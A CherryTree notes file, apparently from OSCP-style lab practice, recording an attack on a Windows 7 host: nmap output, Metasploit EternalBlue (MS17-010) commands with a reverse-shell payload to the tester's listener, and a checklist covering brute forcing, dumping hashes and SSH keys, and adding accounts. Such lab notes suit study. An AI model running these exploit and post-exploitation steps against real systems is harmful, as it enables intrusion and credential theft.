@@ -1,0 +1,416 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <bookmarks list=""/>
+  <node name="10.10.233.157" unique_id="2" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="10" is_bold="1" foreground="" ts_creation="0" ts_lastsave="1675519371">
+    <rich_text>IP :10.10.233.157
+Hostname:
+OS:
+
+
+
+
+
+Linux Proof: </rich_text>
+    <rich_text family="monospace">cat proof.txt &amp;&amp; hostname &amp;&amp; id &amp;&amp; whoami &amp;&amp; /sbin/ifconfig</rich_text>
+    <rich_text>
+Windows Proof: </rich_text>
+    <rich_text family="monospace">hostname &amp;&amp; whoami.exe &amp;&amp; whoami.exe /groups &amp;&amp; type proof.txt &amp;&amp; ipconfig /all</rich_text>
+    <rich_text>
+</rich_text>
+    <node name="Log Book" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="20" is_bold="1" foreground="" ts_creation="0" ts_lastsave="1684588258">
+      <node name="Nmap" unique_id="30" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684584608" ts_lastsave="1684584687">
+        <rich_text scale="h2">Nmap Scan:</rich_text>
+        <rich_text>
+
+
+
+</rich_text>
+        <codebox char_offset="11" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">
+ nmap -sC -sV 10.10.233.157
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-20 07:59 EDT
+Nmap scan report for 10.10.233.157 (10.10.233.157)
+Host is up (0.060s latency).
+Not shown: 991 closed tcp ports (conn-refused)
+PORT      STATE SERVICE            VERSION
+135/tcp   open  msrpc              Microsoft Windows RPC
+139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+3389/tcp  open  ssl/ms-wbt-server?
+| ssl-cert: Subject: commonName=Jon-PC
+| Not valid before: 2023-05-19T11:38:10
+|_Not valid after:  2023-11-18T11:38:10
+|_ssl-date: 2023-05-20T12:00:45+00:00; -1s from scanner time.
+| rdp-ntlm-info: 
+|   Target_Name: JON-PC
+|   NetBIOS_Domain_Name: JON-PC
+|   NetBIOS_Computer_Name: JON-PC
+|   DNS_Domain_Name: Jon-PC
+|   DNS_Computer_Name: Jon-PC
+|   Product_Version: 6.1.7601
+|_  System_Time: 2023-05-20T12:00:40+00:00
+49152/tcp open  msrpc              Microsoft Windows RPC
+49153/tcp open  msrpc              Microsoft Windows RPC
+49154/tcp open  msrpc              Microsoft Windows RPC
+49158/tcp open  msrpc              Microsoft Windows RPC
+49160/tcp open  msrpc              Microsoft Windows RPC
+Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 59m59s, deviation: 2h14m10s, median: -1s
+| smb2-time: 
+|   date: 2023-05-20T12:00:39
+|_  start_date: 2023-05-20T11:38:08
+|_nbstat: NetBIOS name: JON-PC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 02c1fb09f2f1 (unknown)
+| smb2-security-mode: 
+|   210: 
+|_    Message signing enabled but not required
+| smb-os-discovery: 
+|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+|   Computer name: Jon-PC
+|   NetBIOS computer name: JON-PC\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2023-05-20T07:00:39-05:00
+| smb-security-mode: 
+|   account_used: &lt;blank&gt;
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 94.82 seconds
+</codebox>
+      </node>
+      <node name="Exploit" unique_id="31" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684586485" ts_lastsave="1684587696">
+        <rich_text link="webs https://www.exploit-db.com/exploits/41987">https://www.exploit-db.com/exploits/41987</rich_text>
+        <rich_text>
+
+</rich_text>
+        <rich_text link="webs https://www.exploit-db.com/search?cve=2017-0143">https://www.exploit-db.com/search?cve=2017-0143</rich_text>
+        <rich_text>
+
+
+msfconsole:
+
+Step 1:
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+
+Step 2:
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+
+Step 3:
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+
+
+Step 4: 
+
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+
+step 5:
+
+
+
+Step 6:
+
+
+
+step 7:
+
+
+</rich_text>
+        <codebox char_offset="114" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">msfconsole</codebox>
+        <codebox char_offset="125" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">
+msf6 &gt;  use exploit/windows/smb/ms17_010_eternalblue
+[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options
+
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+</codebox>
+        <codebox char_offset="136" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">show options:
+
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Sta
+                                             ndard 7 target machines.
+   SMBPass                         no        (Optional) The password for the specified username
+   SMBUser                         no        (Optional) The username to authenticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standar
+                                             d 7 target machines.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target
+                                              machines.
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.0.2.4         yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+
+
+View the full module info with the info, or info -d command.
+
+</codebox>
+        <codebox char_offset="150" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">set rhosts 10.10.233.157 
+</codebox>
+        <codebox char_offset="162" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">set lhost 10.9.27.13
+</codebox>
+        <codebox char_offset="173" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">set payload windows/x64/shell/reverse_tcp</codebox>
+        <codebox char_offset="185" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">exploit</codebox>
+      </node>
+      <node name="upgrade shell to meter preter" unique_id="32" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684588258" ts_lastsave="1684588260">
+        <rich_text>Once u gain access to the shell type
+
+ctrl</rich_text>
+      </node>
+    </node>
+    <node name="Exploitation" unique_id="22" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1684586334">
+      <rich_text weight="heavy">Service Exploited:  
+Vulnerability Type:
+Exploit POC:</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text weight="heavy">Description</rich_text>
+      <rich_text>: 
+
+
+
+</rich_text>
+      <rich_text underline="single" weight="heavy">Discovery of Vulnerability</rich_text>
+      <rich_text>
+
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+
+
+
+
+
+</rich_text>
+      <rich_text underline="single" weight="heavy">Exploit Code Used</rich_text>
+      <rich_text>
+
+
+
+
+
+
+
+</rich_text>
+      <rich_text underline="single" weight="heavy">Proof\Local.txt File</rich_text>
+      <rich_text>
+
+   ☐ Screenshot with ifconfig\ipconfig
+   ☐ Submit too OSCP Exam Panel
+
+
+
+
+
+
+</rich_text>
+    </node>
+    <node name="Priv Escalation" unique_id="12" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="10" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1500474606">
+      <rich_text weight="heavy">Service Exploited:  
+Vulnerability Type:
+Exploit POC:</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text weight="heavy">Description</rich_text>
+      <rich_text>: 
+
+</rich_text>
+      <rich_text underline="single" weight="heavy">Discovery of Vulnerability</rich_text>
+      <rich_text>
+
+
+
+
+
+
+</rich_text>
+      <rich_text underline="single" weight="heavy">Exploit Code Used</rich_text>
+      <rich_text>
+
+
+
+
+
+
+
+</rich_text>
+      <rich_text underline="single" weight="heavy">Proof\Local.txt File</rich_text>
+      <rich_text>
+
+   ☐ Screenshot with ifconfig\ipconfig
+   ☐ Submit too OSCP Exam Panel
+
+</rich_text>
+    </node>
+    <node name="Goodies" unique_id="3" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="43" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1684267948">
+      <node name="Hashes" unique_id="9" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1492949998"/>
+      <node name="Passwords" unique_id="5" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1492950150"/>
+      <node name="Proof\Flags\Other" unique_id="6" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1496953479"/>
+    </node>
+    <node name="Methodology" unique_id="29" prog_lang="sh" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684267948" ts_lastsave="1684267948">
+      <rich_text>ls -la
+asdasd
+1
+asd
+</rich_text>
+    </node>
+    <node name="Methodology1" unique_id="28" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="13" is_bold="1" foreground="" ts_creation="1496953072" ts_lastsave="1684267931">
+      <rich_text underline="single" weight="heavy">Network Scanning</rich_text>
+      <rich_text>
+
+   ☐  nmap -sn 10.10.233.157
+   ☐  nmap -sL 10.10.233.157
+   ☐  nbtscan -r 10.10.233.157
+   ☐  </rich_text>
+      <rich_text link="node 47">smbtree</rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text underline="single" weight="heavy">Individual Host Scanning</rich_text>
+      <rich_text>
+
+   ☐  nmap  --top-ports 20 --open -iL iplist.txt
+   ☐  nmap -sS -A -sV -O -p- ipaddress
+   ☐  nmap -sU ipaddress
+
+</rich_text>
+      <rich_text underline="single" weight="heavy">Service Scanning</rich_text>
+      <rich_text>
+
+    </rich_text>
+      <rich_text weight="heavy">WebApp</rich_text>
+      <rich_text>
+      ☐   </rich_text>
+      <rich_text link="node 28">Nikto</rich_text>
+      <rich_text>
+      ☐   </rich_text>
+      <rich_text link="node 32">dirb</rich_text>
+      <rich_text>
+      ☐   dirbuster
+      ☐   </rich_text>
+      <rich_text link="node 30">wpscan</rich_text>
+      <rich_text>
+      ☐   dotdotpwn
+      ☐   view source 
+      ☐   davtest\cadevar
+      ☐   droopscan
+      ☐   joomscan
+      ☐   LFI\RFI Test
+      
+    </rich_text>
+      <rich_text weight="heavy">Linux\Windows</rich_text>
+      <rich_text>
+      ☐   snmpwalk -c public -v1 </rich_text>
+      <rich_text style="italic">ipaddress</rich_text>
+      <rich_text> 1
+      ☐   smbclient -L //ipaddress
+      ☐   showmount -e ipaddress port
+      ☐   rpcinfo
+      ☐   Enum4Linux
+    
+    </rich_text>
+      <rich_text weight="heavy">Anything Else</rich_text>
+      <rich_text>
+      ☐   </rich_text>
+      <rich_text link="node 48">nmap scripts</rich_text>
+      <rich_text> (locate *nse* | grep servicename)
+      ☐   </rich_text>
+      <rich_text link="node 35">hydra</rich_text>
+      <rich_text>
+      ☐   MSF Aux Modules
+      ☐   Download the softward
+
+</rich_text>
+      <rich_text underline="single" weight="heavy">Exploitation</rich_text>
+      <rich_text>
+   ☐   Gather Version Numbes
+   ☐   Searchsploit
+   ☐   Default Creds
+   ☐   Creds Previously Gathered
+   ☐   Download the software
+
+</rich_text>
+      <rich_text underline="single" weight="heavy">Post Exploitation</rich_text>
+      <rich_text>
+
+    </rich_text>
+      <rich_text weight="heavy">Linux</rich_text>
+      <rich_text>
+      ☐   linux-local-enum.sh
+      ☐   linuxprivchecker.py
+      ☐   linux-exploit-suggestor.sh
+      ☐   unix-privesc-check.py
+
+    </rich_text>
+      <rich_text weight="heavy">Windows</rich_text>
+      <rich_text>
+      ☐   wpc.exe
+      ☐   windows-exploit-suggestor.py
+      ☐   </rich_text>
+      <rich_text link="webs https://github.com/pentestmonkey/windows-privesc-check/blob/master/windows_privesc_check.py">windows_privesc_check.py</rich_text>
+      <rich_text>
+      ☐  	windows-privesc-check2.exe
+
+</rich_text>
+      <rich_text underline="single" weight="heavy">Priv Escalation</rich_text>
+      <rich_text>
+   ☐  </rich_text>
+      <rich_text link="node 36">acesss internal services (portfwd)</rich_text>
+      <rich_text>
+   ☐  add account
+
+</rich_text>
+      <rich_text weight="heavy">Windows</rich_text>
+      <rich_text>
+   ☐  List of exploits
+
+</rich_text>
+      <rich_text weight="heavy">Linux</rich_text>
+      <rich_text>
+   ☐  sudo su 
+   ☐  KernelDB
+   ☐  Searchsploit
+
+</rich_text>
+      <rich_text underline="single" weight="heavy">Final</rich_text>
+      <rich_text>
+   ☐  Screenshot of IPConfig\WhoamI
+   ☐  Copy proof.txt
+   ☐  Dump hashes 
+   ☐  Dump SSH Keys
+   ☐  Delete files</rich_text>
+    </node>
+  </node>
+</cherrytree>
